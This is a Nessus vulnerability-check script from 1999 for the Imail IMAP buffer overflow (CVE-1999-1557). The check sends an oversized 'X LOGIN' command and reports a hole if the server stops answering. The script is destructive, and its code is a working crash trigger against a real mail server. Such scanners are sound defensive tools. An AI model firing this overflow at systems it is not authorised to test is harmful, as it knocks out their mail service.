#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10123);
 script_bugtraq_id(502);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-1557");
 name["english"] = "Imail's imap buffer overflow";
 name["francais"] = "Dépassement de buffer dans imap de imail";
 script_name(english:name["english"],
 	     francais:name["francais"]);
	     
 
 desc["english"] = "A buffer overflow in the remote imap
server allows an intruder to execute arbitrary code
on this host.

Risk factor : High

Solution : Upgrade your imap server to the newest version";
 
 desc["francais"] = "Un dépassement de buffer dans
le serveur imap permet à un intrus d'executer du code
arbitraire sur cette machine.

Facteur de risque : Elevé.

Solution : Mettez à jour votre serveur imap";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 summary["english"] = "Imail's imap buffer overflow"; 
 summary["francais"] = "Dépassement de buffer dans imap de imail";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 	 	  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
	       
 script_dependencie("find_service.nes", "imap_overflow.nasl");
 script_exclude_keys("imap/false_imap", "imap/overflow");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

f = get_kb_item("imap/false_imap");
if(f)exit(0);
port = get_kb_item("Services/imap");
bof = get_kb_item("imap/overflow");
if(bof)exit(0);

if(!port)port = 143;
if(get_port_state(port))
{
 data = string("X LOGIN ", crap(1200), " ", crap(1300), "\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  buf = recv_line(socket:soc, length:1024);
  if ( "imail" >!< tolower(buf) ) exit(0);
 if(!strlen(buf))
 	{ 
	 	close(soc);
		exit(0);
	}
  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  if(!strlen(buf)){
  	security_hole(port);
	set_kb_item(name:"imap/overflow_imail", value:TRUE);
	}
  close(soc);
 }
}
